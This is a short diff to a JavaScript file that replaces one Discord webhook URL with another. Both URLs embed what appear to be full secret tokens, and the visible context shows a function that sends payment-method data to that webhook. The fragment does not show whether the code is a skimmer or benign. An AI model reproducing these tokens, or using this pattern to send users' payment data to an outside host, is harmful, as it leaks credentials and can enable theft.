@@ -1,4 +1,4 @@
-const discordWebhookUrl = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';  // Замените на свой вебхук
+const discordWebhookUrl = 'https://discordapp.com/api/webhooks/1307681216220233800/cCpZnpuKDlPl6PnQnqO6rvhPHyX8KEQ5eqq16y_PaTVaTzOGAOS3ANs4WxWfPc9yAH_Z';  // Замените на свой вебхук
 
 // Функция для отправки данных на вебхук Discord
 function sendPaymentMethodToDiscord(method) {
